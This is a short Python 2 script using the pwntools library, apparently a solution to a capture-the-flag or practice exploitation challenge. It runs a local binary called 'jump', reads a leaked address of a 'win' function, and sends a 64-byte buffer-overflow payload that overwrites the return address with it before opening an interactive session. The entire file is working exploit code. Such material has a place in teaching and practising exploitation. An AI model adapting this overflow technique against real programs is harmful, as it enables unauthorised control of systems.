#!usr/bin/env python2

from pwn import *

p = process('./jump')

p.recvuntil('at ')

win = int(p.recvline(), 16)

#print(win)
p.recvline()

# fill up payload with 64 bytes
# append the win address onto the 64 bytes
payload = fit({ 64: p32(win)})

p.sendline(payload)

p.interactive()
